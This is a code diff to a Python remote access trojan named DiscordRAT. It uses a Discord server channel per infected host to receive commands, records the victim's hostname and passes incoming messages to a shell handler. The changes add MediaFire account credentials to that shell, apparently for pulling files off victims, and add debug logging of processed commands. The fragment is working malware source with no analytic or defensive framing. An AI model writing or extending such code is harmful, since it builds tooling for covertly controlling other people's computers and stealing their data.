@@ -4,11 +4,11 @@ from asyncio import TimeoutError
 import discord, random
 
 class DiscordRAT(discord.Client):
-    def __init__(self, serverID: any, categoryID: any, debugMode: bool=False, *args, **kwargs) -> None:
+    def __init__(self, serverID: any, categoryID: any, mediafireEmail:str=None, mediafirePassword:str=None, debugMode: bool=False, *args, **kwargs) -> None:
         self.myName = gethostname()
         self.server = {"id": int(serverID), "category": int(categoryID)}
         self.debug = debugMode
-        self.s = Shell()
+        self.s = Shell(self, mediafireEmail, mediafirePassword)
         self.myChannel = None
         super().__init__(*args, **kwargs)
     
@@ -47,4 +47,5 @@ class DiscordRAT(discord.Client):
         if message.author.id == self.user.id and message.content != "check":
             return
         if message.channel.id == self.myChannel:
+            if self.debug: print("[.] Processing:", message.content+"...")
             await self.s.process(message)
